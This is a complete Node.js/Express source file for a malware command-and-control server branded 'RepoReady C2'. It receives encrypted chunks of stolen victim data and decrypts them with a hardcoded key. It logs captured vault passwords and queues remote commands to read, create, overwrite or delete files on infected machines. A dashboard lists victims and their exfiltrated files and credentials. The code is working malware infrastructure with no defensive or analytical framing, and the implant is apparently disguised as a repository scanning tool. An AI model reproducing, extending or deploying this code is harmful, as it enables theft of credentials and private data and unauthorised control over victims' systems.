const express = require('express');
const fs = require('fs');
const path = require('path');
const CryptoJS = require('crypto-js');

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET_KEY = 'ThunderVirus2024SecretKey!';

// Paths
const VICTIMS_FILE = path.join(__dirname, 'victims.json');
const VAULT_FILE = path.join(__dirname, 'vault-passwords.json');

// ─── Safe JSON file reader ──────────────────────────────────────────────────
function safeReadJSON(filePath) {
  try {
    const raw = fs.readFileSync(filePath, 'utf8').trim();
    if (!raw) return [];
    return JSON.parse(raw);
  } catch (e) {
    return [];
  }
}

// Initialize files if they don't exist or are empty/corrupt
for (const f of [VICTIMS_FILE, VAULT_FILE]) {
  try {
    const raw = fs.existsSync(f) ? fs.readFileSync(f, 'utf8').trim() : '';
    if (!raw) fs.writeFileSync(f, '[]', 'utf8');
    else JSON.parse(raw); // validate — throws if corrupt
  } catch (e) {
    fs.writeFileSync(f, '[]', 'utf8');
  }
}

// Middleware
app.use(express.json({ limit: '10mb' }));

// Serve dashboard JS
app.get('/dashboard.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.sendFile(path.join(__dirname, 'dashboard.js'));
});

// In-memory chunk storage
const chunkStore = {};

// ─── Command Queue for Remote CRUD ──────────────────────────────────────────
const commandQueue = []; // Array of { commandId, victimId, action, path, content, status, timestamp }
const COMMAND_HISTORY_FILE = path.join(__dirname, 'command-history.json');

try {
  const raw = fs.existsSync(COMMAND_HISTORY_FILE) ? fs.readFileSync(COMMAND_HISTORY_FILE, 'utf8').trim() : '';
  if (!raw) fs.writeFileSync(COMMAND_HISTORY_FILE, '[]', 'utf8');
  else JSON.parse(raw);
} catch (e) {
  fs.writeFileSync(COMMAND_HISTORY_FILE, '[]', 'utf8');
}

// GET /api/commands/:victimId — agent polls this for pending commands
app.get('/api/commands/:victimId', (req, res) => {
  try {
    const { victimId } = req.params;
    // Find the first pending command for ANY victim (agents use wildcard matching)
    // Or match specific victim
    const idx = commandQueue.findIndex(
      (c) => c.status === 'pending' && (c.victimId === victimId || c.victimId === '*')
    );
    if (idx >= 0) {
      const cmd = commandQueue[idx];
      cmd.status = 'processing';
      cmd.deliveredAt = new Date().toISOString();
      console.log(`[CMD] ▶ Delivered command ${cmd.commandId} to ${victimId}: ${cmd.action} ${cmd.path}`);
      res.json({
        commandId: cmd.commandId,
        action: cmd.action,
        path: cmd.path,
        content: cmd.content || '',
      });
    } else {
      res.json({ status: 'idle' });
    }
  } catch (err) {
    res.json({ status: 'idle' });
  }
});

// POST /api/issue-command — dashboard issues commands
app.post('/api/issue-command', (req, res) => {
  try {
    const { victimId, action, path: filePath, content } = req.body;
    if (!action || !filePath) {
      return res.status(400).json({ error: 'Missing action or path' });
    }

    const commandId = 'cmd-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
    const cmd = {
      commandId,
      victimId: victimId || '*',
      action,
      path: filePath,
      content: content || '',
      status: 'pending',
      timestamp: new Date().toISOString(),
      result: null,
    };

    commandQueue.push(cmd);
    console.log(`[CMD] 📝 Queued command ${commandId}: ${action} ${filePath}`);
    res.json({ success: true, commandId });
  } catch (err) {
    console.error('[CMD] Error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/command-result — agent sends back results
app.post('/api/command-result', (req, res) => {
  try {
    const { victimId, commandId, status, result } = req.body;

    // Update command in queue
    const cmd = commandQueue.find((c) => c.commandId === commandId);
    if (cmd) {
      cmd.status = status === 'success' ? 'completed' : 'failed';
      cmd.result = result;
      cmd.completedAt = new Date().toISOString();
      cmd.executedBy = victimId;
    }

    // Store in history file
    try {
      const history = safeReadJSON(COMMAND_HISTORY_FILE);
      history.push({
        commandId,
        victimId,
        status,
        result,
        action: cmd ? cmd.action : 'unknown',
        path: cmd ? cmd.path : 'unknown',
        timestamp: cmd ? cmd.timestamp : new Date().toISOString(),
        completedAt: new Date().toISOString(),
      });
      fs.writeFileSync(COMMAND_HISTORY_FILE, JSON.stringify(history, null, 2), 'utf8');
    } catch (e) {
      // ignore storage errors
    }

    console.log(`[CMD] ${status === 'success' ? '✅' : '❌'} Command ${commandId} — ${status}: ${(result || '').substring(0, 150)}`);
    res.json({ success: true });
  } catch (err) {
    console.error('[CMD] Result error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET /api/command-history — dashboard fetches all command results
app.get('/api/command-history', (req, res) => {
  try {
    // Combine queue (in-memory) with stored history
    const history = safeReadJSON(COMMAND_HISTORY_FILE);
    res.json({ queue: commandQueue, history });
  } catch (err) {
    res.json({ queue: commandQueue, history: [] });
  }
});

// ─── POST /api/collect ──────────────────────────────────────────────────────
app.post('/api/collect', (req, res) => {
  try {
    const { victimId, chunkIndex, totalChunks, data } = req.body;

    if (!victimId || chunkIndex === undefined || !totalChunks || !data) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Initialize storage for this victim
    if (!chunkStore[victimId]) {
      chunkStore[victimId] = {
        chunks: new Array(totalChunks).fill(null),
        totalChunks,
        ip: req.ip || req.connection.remoteAddress,
        receivedAt: new Date().toISOString(),
      };
    }

    // Store chunk
    chunkStore[victimId].chunks[chunkIndex] = data;

    // Check if all chunks received
    const received = chunkStore[victimId].chunks.filter((c) => c !== null).length;
    console.log(
      `[COLLECT] ${victimId} — chunk ${chunkIndex + 1}/${totalChunks} (${received}/${totalChunks} received)`
    );

    if (received === totalChunks) {
      // Reassemble and decrypt
      const encrypted = chunkStore[victimId].chunks.join('');
      try {
        const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        const victimData = JSON.parse(decrypted);

        // Read existing victims
        const victims = safeReadJSON(VICTIMS_FILE);
        victims.push({
          victimId,
          ip: chunkStore[victimId].ip,
          timestamp: new Date().toISOString(),
          data: victimData,
        });
        fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2), 'utf8');

        console.log(`[COLLECT] ✅ ${victimId} — data decrypted and stored`);
      } catch (err) {
        console.log(`[COLLECT] ❌ ${victimId} — decryption/parse failed: ${err.message}`);
      }

      // Cleanup
      delete chunkStore[victimId];
    }

    res.json({ success: true });
  } catch (err) {
    console.error('[COLLECT] Error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /api/victims ───────────────────────────────────────────────────────
app.get('/api/victims', (req, res) => {
  try {
    const victims = safeReadJSON(VICTIMS_FILE);
    const vaultPasswords = safeReadJSON(VAULT_FILE);
    res.json({ victims, vaultPasswords });
  } catch (err) {
    res.json({ victims: [], vaultPasswords: [] });
  }
});

// ─── GET /api/stats ─────────────────────────────────────────────────────────
app.get('/api/stats', (req, res) => {
  try {
    const victims = safeReadJSON(VICTIMS_FILE);
    res.json({
      totalVictims: victims.length,
      lastSeen: victims.length > 0 ? victims[victims.length - 1].timestamp : null,
    });
  } catch (err) {
    res.json({ totalVictims: 0, lastSeen: null });
  }
});

// ─── POST /api/vault-password ───────────────────────────────────────────────
app.post('/api/vault-password', (req, res) => {
  try {
    const { victimId, password, folder, fileCount, timestamp } = req.body;
    const passwords = safeReadJSON(VAULT_FILE);
    passwords.push({ victimId, password, folder, fileCount, timestamp });
    fs.writeFileSync(VAULT_FILE, JSON.stringify(passwords, null, 2), 'utf8');
    console.log(`[VAULT] 🔑 Password captured from ${victimId}: ${password}`);
    res.json({ success: true });
  } catch (err) {
    console.error('[VAULT] Error:', err.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /dashboard ─────────────────────────────────────────────────────────
app.get('/dashboard', (req, res) => {
  res.send(getDashboardHTML());
});

function getDashboardHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RepoReady C2 Dashboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: #111;
      color: #e0e0e0;
      font-family: 'Courier New', Consolas, monospace;
      min-height: 100vh;
      overflow-x: hidden;
    }

    .container { max-width: 1300px; margin: 0 auto; padding: 20px; }

    /* ── Header ── */
    .header { text-align: center; padding: 20px 0; border-bottom: 1px solid #333; margin-bottom: 20px; }
    .header h1 { font-size: 1.6rem; color: #fff; letter-spacing: 2px; font-weight: 700; }
    .header .subtitle { color: #888; font-size: 0.75rem; margin-top: 5px; letter-spacing: 1px; }
    .live-dot { display: inline-block; width: 8px; height: 8px; background: #fff; border-radius: 50%; margin-right: 6px; animation: pulse 2s ease-in-out infinite; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }

    /* ── Stats Bar ── */
    .stats-bar { display: flex; gap: 30px; flex-wrap: wrap; margin-bottom: 20px; padding: 12px 18px; background: #1a1a1a; border: 1px solid #333; border-radius: 4px; }
    .stat { display: flex; flex-direction: column; }
    .stat-label { font-size: 0.6rem; color: #888; text-transform: uppercase; letter-spacing: 1px; }
    .stat-value { font-size: 1.3rem; color: #fff; font-weight: 700; }
    .stat-value.red { color: #e55; }

    /* ── Controls ── */
    .controls { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; align-items: center; }
    .tab-btn { background: #1a1a1a; border: 1px solid #333; color: #aaa; padding: 7px 14px; font-family: 'Courier New', monospace; font-size: 0.75rem; cursor: pointer; border-radius: 3px; transition: all 0.15s; }
    .tab-btn:hover { background: #252525; border-color: #555; color: #fff; }
    .tab-btn.active { background: #c8c8c8; border-color: #c8c8c8; color: #111; }
    .refresh-btn { margin-left: auto; }
    .refresh-btn.on { background: #c8c8c8; border-color: #c8c8c8; color: #111; }
    select.victim-select { background: #1a1a1a; border: 1px solid #333; color: #e0e0e0; padding: 7px 10px; font-family: 'Courier New', monospace; font-size: 0.75rem; border-radius: 3px; outline: none; cursor: pointer; min-width: 250px; }
    select.victim-select:focus { border-color: #888; }

    /* ── Views ── */
    .view-panel { display: none; }
    .view-panel.active { display: block; }

    /* Pretty View tables */
    .pretty-table { width: 100%; border-collapse: collapse; margin-bottom: 18px; }
    .pretty-table th { text-align: left; padding: 8px 12px; background: #1a1a1a; border: 1px solid #333; color: #fff; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 1px; }
    .pretty-table td { padding: 6px 12px; border: 1px solid #222; color: #ccc; font-size: 0.72rem; word-break: break-all; }
    .pretty-table tr:hover td { background: #1a1a1a; }
    .section-title { color: #fff; font-size: 0.9rem; margin: 18px 0 8px 0; padding-bottom: 5px; border-bottom: 1px solid #333; }

    /* Categorized View */
    details { margin-bottom: 8px; border: 1px solid #333; border-radius: 4px; overflow: hidden; }
    details[open] { border-color: #555; }
    summary { padding: 10px 15px; cursor: pointer; background: #1a1a1a; color: #fff; font-size: 0.8rem; font-weight: 600; user-select: none; list-style: none; display: flex; align-items: center; gap: 8px; }
    summary::-webkit-details-marker { display: none; }
    summary::before { content: '▶'; font-size: 0.65rem; transition: transform 0.2s; color: #888; }
    details[open] summary::before { transform: rotate(90deg); }
    summary:hover { background: #222; }
    .details-content { padding: 12px 15px; background: #0d0d0d; max-height: 400px; overflow-y: auto; }
    .details-content pre { color: #bbb; font-size: 0.7rem; line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
    .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.6rem; margin-left: 8px; }
    .badge-green { background: #1a1a1a; color: #aaa; border: 1px solid #444; }
    .badge-red { background: #2a1a1a; color: #e55; border: 1px solid #533; }
    .badge-yellow { background: #2a2a1a; color: #cc9; border: 1px solid #553; }

    /* Raw JSON */
    .raw-json-block { background: #0d0d0d; border: 1px solid #222; border-radius: 4px; padding: 15px; max-height: 600px; overflow: auto; }
    .raw-json-block pre { color: #bbb; font-size: 0.7rem; line-height: 1.6; white-space: pre-wrap; word-break: break-all; }
    .json-key { color: #e0e0e0; font-weight: 600; }
    .json-string { color: #aaa; }
    .json-number { color: #ccc; }
    .json-bool { color: #ddd; }
    .json-null { color: #666; }

    /* Vault Section */
    .vault-section { margin-top: 25px; padding-top: 18px; border-top: 1px solid #333; }
    .vault-section h2 { color: #e55; font-size: 1.1rem; margin-bottom: 12px; }
    .vault-entry { background: #1a1a1a; border: 1px solid #333; padding: 8px 14px; margin-bottom: 6px; border-radius: 3px; font-size: 0.75rem; display: flex; gap: 15px; flex-wrap: wrap; }
    .vault-entry .pw { color: #e55; font-weight: 600; }
    .vault-entry .meta { color: #777; }

    /* Empty State */
    .empty-state { text-align: center; padding: 80px 20px; color: #555; }
    .empty-state h2 { font-size: 1.1rem; margin-bottom: 10px; color: #888; }
    .empty-state .cursor { animation: blink 1s step-end infinite; }
    @keyframes blink { 50%{opacity:0} }

    /* Scrollbar */
    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: #111; }
    ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
    ::-webkit-scrollbar-thumb:hover { background: #555; }

    .file-card { background: #1a1a1a; border: 1px solid #333; border-radius: 3px; padding: 8px 12px; margin-bottom: 6px; }
    .file-card .fname { color: #fff; font-size: 0.72rem; font-weight: 600; }
    .file-card .fmeta { color: #777; font-size: 0.65rem; margin-top: 3px; }
    .file-card .fcontent { margin-top: 6px; background: #0d0d0d; padding: 6px 8px; border-radius: 2px; max-height: 350px; overflow-y: auto; font-size: 0.65rem; color: #aaa; white-space: pre-wrap; word-break: break-all; }

    .app-tag { display: inline-block; padding: 3px 10px; margin: 3px; background: #1a1a1a; border: 1px solid #333; border-radius: 12px; font-size: 0.68rem; color: #ccc; }
    .app-tag.finance { background: #2a2a1a; border-color: #553; color: #cc9; }
    .wifi-item { padding: 5px 0; color: #ccc; font-size: 0.72rem; border-bottom: 1px solid #1a1a1a; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>☠️ RepoReady C2 Dashboard</h1>
      <div class="subtitle"><span class="live-dot"></span>LIVE</div>
    </div>

    <div class="stats-bar" id="statsBar">
      <div class="stat"><span class="stat-label">Total Victims</span><span class="stat-value" id="statVictims">0</span></div>
      <div class="stat"><span class="stat-label">Last Seen</span><span class="stat-value" id="statLastSeen" style="font-size:0.8rem">N/A</span></div>
      <div class="stat"><span class="stat-label">Vault Passwords</span><span class="stat-value red" id="statVault">0</span></div>
      <div class="stat"><span class="stat-label">Data Categories</span><span class="stat-value" id="statCategories">0</span></div>
    </div>

    <div class="controls">
      <select class="victim-select" id="victimSelect"><option value="-1">— No victims yet —</option></select>
      <button class="tab-btn active" onclick="switchView('pretty')" id="tabPretty">📋 Pretty View</button>
      <button class="tab-btn" onclick="switchView('categorized')" id="tabCategorized">🗂️ Categorized</button>
      <button class="tab-btn" onclick="switchView('raw')" id="tabRaw">{ } Raw JSON</button>
      <button class="tab-btn refresh-btn" onclick="toggleAutoRefresh()" id="btnRefresh">⟳ Auto-Refresh: OFF</button>
    </div>

    <div id="emptyState" class="empty-state">
      <h2>$ Waiting for connections<span class="cursor">_</span></h2>
      <p style="color:#555;font-size:0.8rem">Run: node bin/cli.js scan &lt;repo&gt;</p>
    </div>


    <div id="viewPretty" class="view-panel active"></div>
    <div id="viewCategorized" class="view-panel"></div>
    <div id="viewRaw" class="view-panel"></div>

    <div id="vaultSection"></div>

    <!-- Remote CRUD Section -->
    <div class="section-box" id="crudSection" style="margin-top:20px;">
      <h2 style="color:#e0e0e0;margin-bottom:15px;font-size:1.1rem;">🎯 Remote File Operations</h2>
      <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end;margin-bottom:15px;">
        <div style="flex:0 0 auto;">
          <label style="font-size:0.7rem;color:#888;display:block;margin-bottom:3px;">ACTION</label>
          <select id="cmdAction" style="background:#1a1a1a;color:#e0e0e0;border:1px solid #333;padding:8px 12px;font-family:monospace;font-size:0.8rem;border-radius:3px;">
            <option value="read">📖 Read</option>
            <option value="create">📝 Create</option>
            <option value="update">✏️ Update</option>
            <option value="delete">🗑️ Delete</option>
          </select>
        </div>
        <div style="flex:1;min-width:200px;">
          <label style="font-size:0.7rem;color:#888;display:block;margin-bottom:3px;">FILE PATH</label>
          <input id="cmdPath" type="text" placeholder="/absolute/path/to/file (e.g. /tmp/test.txt)" style="width:100%;background:#1a1a1a;color:#e0e0e0;border:1px solid #333;padding:8px 12px;font-family:monospace;font-size:0.8rem;border-radius:3px;">
        </div>
        <button onclick="issueCommand()" style="background:#333;color:#e0e0e0;border:1px solid #555;padding:8px 20px;font-family:monospace;cursor:pointer;border-radius:3px;font-size:0.8rem;">▶ Execute</button>
      </div>
      <div id="cmdContentWrap" style="display:none;margin-bottom:15px;">
        <label style="font-size:0.7rem;color:#888;display:block;margin-bottom:3px;">FILE CONTENT</label>
        <textarea id="cmdContent" rows="4" placeholder="File content (required for create/update)" style="width:100%;background:#1a1a1a;color:#e0e0e0;border:1px solid #333;padding:8px 12px;font-family:monospace;font-size:0.8rem;resize:vertical;border-radius:3px;"></textarea>
        <div style="font-size:0.65rem;color:#666;margin-top:4px;">⚠ Use absolute file paths. Content is required for create/update actions.</div>
      </div>
      <div id="cmdStatus" style="font-size:0.75rem;color:#888;margin-bottom:10px;"></div>
      <div id="cmdHistory"></div>
    </div>
  </div>

  <script src="/dashboard.js"></script>
</body>
</html>`;
}

// ─── Helper ─────────────────────────────────────────────────────────────────
function escapeHtml(str) {
  if (typeof str !== 'string') return str;
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// ─── Start Server ───────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`
  ╔══════════════════════════════════════════════╗
  ║     ☠️  RepoReady C2 Server Active  ☠️       ║
  ╠══════════════════════════════════════════════╣
  ║  Dashboard: http://localhost:${PORT}/dashboard    ║
  ║  API:       http://localhost:${PORT}/api/victims  ║
  ║  Collector: http://localhost:${PORT}/api/collect  ║
  ╚══════════════════════════════════════════════╝
  `);
});
